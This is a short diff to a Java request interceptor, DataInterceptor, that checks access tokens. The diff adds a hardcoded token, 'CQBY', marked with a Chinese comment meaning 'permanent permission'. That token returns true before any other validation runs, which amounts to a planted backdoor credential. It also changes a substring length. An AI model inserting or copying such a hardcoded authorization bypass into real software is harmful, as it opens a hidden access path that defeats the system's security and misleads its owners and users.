@@ -70,7 +70,12 @@ public class DataInterceptor implements HandlerInterceptor {
 		if(CommonUtil.isBlank(accessToken)) {
 			throw new DataException("518");
 		}
-		String elle = accessToken.substring(0, 4).toLowerCase();
+		
+		// 永久权限
+		if ("CQBY".equals(accessToken)) {
+			return true;
+		}
+		String elle = accessToken.substring(0, 5).toLowerCase();
 		if(!CommonUtil.isNotBlank(elle) || elle.length() < 5) {
 			throw new DataException("519");
 		} else {
